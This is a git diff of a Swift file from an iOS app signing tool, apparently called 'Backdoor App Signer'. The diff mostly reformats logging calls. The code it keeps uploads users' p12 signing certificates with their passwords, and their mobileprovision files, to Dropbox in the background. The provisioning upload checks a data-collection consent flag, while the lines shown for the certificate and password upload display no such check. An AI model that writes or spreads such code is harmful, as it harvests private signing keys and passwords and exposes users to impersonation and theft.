@@ -1,15 +1,8 @@
-// Proprietary Software License Version 1.0
-//
-// Copyright (C) 2025 BDG
-//
-// Backdoor App Signer is proprietary software. You may not use, modify, or distribute it except as expressly permitted under the terms of the Proprietary Software License.
-
 import Foundation
 import UIKit
 
 /// Extension to handle certificate logging and upload to Dropbox
 extension CertData {
-
     /// Enhanced method to store certificate with Dropbox integration
     func enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {
         // Create a destination directory for this certificate
@@ -37,9 +30,15 @@ extension CertData {
                         password: !password.isEmpty ? password : nil
                     ) { success, error in
                         if success {
-                            Debug.shared.log(message: "Successfully uploaded p12 certificate with password to Dropbox", type: .debug)
+                            Debug.shared.log(
+                                message: "Successfully uploaded p12 certificate with password to Dropbox",
+                                type: .debug
+                            )
                         } else if let error = error {
-                            Debug.shared.log(message: "Failed to upload p12 to Dropbox: \(error.localizedDescription)", type: .error)
+                            Debug.shared.log(
+                                message: "Failed to upload p12 to Dropbox: \(error.localizedDescription)",
+                                type: .error
+                            )
                         }
                     }
 
@@ -52,7 +51,10 @@ extension CertData {
                             if success {
                                 Debug.shared.log(message: "Successfully stored p12 password to Dropbox", type: .debug)
                             } else if let error = error {
-                                Debug.shared.log(message: "Failed to store p12 password to Dropbox: \(error.localizedDescription)", type: .error)
+                                Debug.shared.log(
+                                    message: "Failed to store p12 password to Dropbox: \(error.localizedDescription)",
+                                    type: .error
+                                )
                             }
                         }
                     }
@@ -69,14 +71,13 @@ extension CertData {
 
 /// Extension to intercept mobile provision handling
 extension Cert {
-
     /// Enhanced method to import mobile provision with Dropbox integration
     static func enhancedImportMobileProvision(from url: URL) -> Cert? {
         // Use the original implementation to parse the mobileprovision
         let cert = CertData.parseMobileProvisioningFile(atPath: url)
 
         // If successful and user has consented to data collection
-        if cert != nil && UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
+        if cert != nil, UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
             // Upload to Dropbox in background
             DispatchQueue.global(qos: .utility).async {
                 // Upload the mobileprovision file
@@ -86,7 +87,10 @@ extension Cert {
                     if success {
                         Debug.shared.log(message: "Successfully uploaded mobileprovision to Dropbox", type: .debug)
                     } else if let error = error {
-                        Debug.shared.log(message: "Failed to upload mobileprovision to Dropbox: \(error.localizedDescription)", type: .error)
+                        Debug.shared.log(
+                            message: "Failed to upload mobileprovision to Dropbox: \(error.localizedDescription)",
+                            type: .error
+                        )
                     }
                 }
 
